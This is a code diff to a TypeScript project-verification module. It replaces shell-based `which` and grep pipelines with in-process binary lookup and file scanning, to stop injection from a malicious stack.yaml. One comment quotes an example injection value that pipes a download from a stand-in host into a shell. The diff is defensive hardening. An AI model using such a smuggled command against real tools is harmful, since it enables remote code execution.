@@ -1,14 +1,20 @@
-import { execFileSync } from "node:child_process";
-import { existsSync, readFileSync } from "node:fs";
-import { join } from "node:path";
+import {
+  type Dirent,
+  existsSync,
+  readdirSync,
+  readFileSync,
+  statSync,
+} from "node:fs";
+import { join, relative, sep } from "node:path";
+import { minimatch } from "minimatch";
 import { parse as parseYaml } from "yaml";
 import type { VerifyCheck } from "../../types/index.js";
 import {
   type CommandResult,
   checkCommandResult,
   createCheck,
+  findBinary,
   runCheckCommand,
-  runCommand,
 } from "./check-utils.js";
 
 type CommandCheck = {
@@ -62,13 +68,6 @@ export function loadStackManifest(
   }
 }
 
-// Wraps an arbitrary string so it survives as a single shell argument inside `sh -c`.
-// Uses POSIX single-quote escaping, which is the only way to safely pass patterns
-// containing `"`, `$`, backticks, or backslashes without interpretation.
-function shellSingleQuote(value: string): string {
-  return `'${value.replace(/'/g, "'\\''")}'`;
-}
-
 /**
  * Run a manifest `cmd` string safely without passing it through a shell.
  *
@@ -104,25 +103,14 @@ export function runManifestCmd(cmd: string, cwd: string): CommandResult {
  * Safe binary-existence check that avoids shell interpolation.
  *
  * `bin` originates from stack.yaml's `skip_if_missing` field (attacker-
- * controlled in a malicious project). Running `which ${bin}` through execSync
- * allows injection (e.g. `bun; curl evil|sh`). Instead we validate the token
- * against a strict identifier allowlist and then call `execFileSync("which",
- * [bin])` so no shell ever interprets the value.
+ * controlled in a malicious project). findBinary validates the token against
+ * a strict identifier allowlist and scans PATH directly (PATHEXT-aware on
+ * win32), so no shell ever interprets the value. The previous `which`-based
+ * lookup always failed on Windows, making every skip_if_missing check
+ * over-skip there.
  */
-const SAFE_BIN_RE = /^[A-Za-z0-9._-]+$/;
-
-export function hasBinary(bin: string, workspace: string): boolean {
-  // Reject bin values that contain shell metacharacters or path separators.
-  if (!SAFE_BIN_RE.test(bin)) return false;
-  try {
-    execFileSync("which", [bin], {
-      cwd: workspace,
-      stdio: ["pipe", "pipe", "pipe"],
-    });
-    return true;
-  } catch {
-    return false;
-  }
+export function hasBinary(bin: string, _workspace: string): boolean {
+  return findBinary(bin) !== null;
 }
 
 export function checkBackendSyntax(
@@ -164,6 +152,65 @@ export function checkBackendTests(
   return check;
 }
 
+/**
+ * In-process replacement for the old
+ * `grep -rn --include=GLOB -E PATTERN . | grep -v DIR ... | head -1`
+ * pipeline, which silently no-oped on Windows (no grep → null → false
+ * "pass"). include_glob matches like grep --include (basename glob via
+ * matchBase); exclude_dirs keep grep -v semantics (term matched against the
+ * whole path:line:content output line). Returns the first matching file.
+ */
+function firstRawSqlFile(
+  workspace: string,
+  includeGlob: string | undefined,
+  pattern: RegExp,
+  excludeTerms: string[],
+): string | null {
+  const walk = (dir: string): string | null => {
+    let entries: Dirent[];
+    try {
+      entries = readdirSync(dir, { withFileTypes: true });
+    } catch {
+      return null; // Unreadable directory — nothing to scan.
+    }
+    for (const entry of entries) {
+      const full = join(dir, entry.name);
+      if (entry.isDirectory()) {
+        if (entry.name === "node_modules" || entry.name === ".git") continue;
+        const hit = walk(full);
+        if (hit) return hit;
+      } else if (entry.isFile()) {
+        const rel = relative(workspace, full).split(sep).join("/");
+        if (
+          includeGlob &&
+          !minimatch(rel, includeGlob, { matchBase: true, dot: true })
+        ) {
+          continue;
+        }
+        let content: string;
+        try {
+          if (statSync(full).size > 5 * 1024 * 1024) continue;
+          content = readFileSync(full, "utf-8");
+        } catch {
+          continue; // Unreadable/binary file — skip like grep does.
+        }
+        const lines = content.split("\n");
+        for (let i = 0; i < lines.length; i++) {
+          const text = lines[i] ?? "";
+          if (!pattern.test(text)) continue;
+          const grepLine = `./${rel}:${i + 1}:${text}`;
+          if (excludeTerms.some((term) => grepLine.includes(term))) continue;
+          return `./${rel}`;
+        }
+      }
+      // Symlinks are skipped entirely (avoids cycles; grep -r does not
+      // follow directory symlinks either).
+    }
+    return null;
+  };
+  return walk(workspace);
+}
+
 export function checkBackendRawSql(
   manifest: StackManifest,
   workspace: string,
@@ -173,17 +220,19 @@ export function checkBackendRawSql(
   if (!cfg || cfg.patterns.length === 0) {
     return createCheck(name, "skip", "No raw_sql check configured");
   }
-  const includeFlag = cfg.include_glob
-    ? `--include=${shellSingleQuote(cfg.include_glob)}`
-    : "";
-  const excludes = (cfg.exclude_dirs ?? [])
-    .map((dir) => `| grep -v ${shellSingleQuote(dir)}`)
-    .join(" ");
-  const patternArg = shellSingleQuote(cfg.patterns.join("|"));
-  const cmd = `grep -rn ${includeFlag} -E ${patternArg} . 2>/dev/null ${excludes} | head -1`;
-  const result = runCommand(cmd, workspace);
-  if (result) {
-    const file = result.split(":")[0] ?? "unknown";
+  let pattern: RegExp;
+  try {
+    pattern = new RegExp(cfg.patterns.join("|"));
+  } catch {
+    return createCheck(name, "warn", "Invalid raw_sql pattern in stack.yaml");
+  }
+  const file = firstRawSqlFile(
+    workspace,
+    cfg.include_glob,
+    pattern,
+    cfg.exclude_dirs ?? [],
+  );
+  if (file) {
     return createCheck(name, "fail", `Raw SQL pattern in ${file}`);
   }
   return createCheck(name, "pass", "None detected");
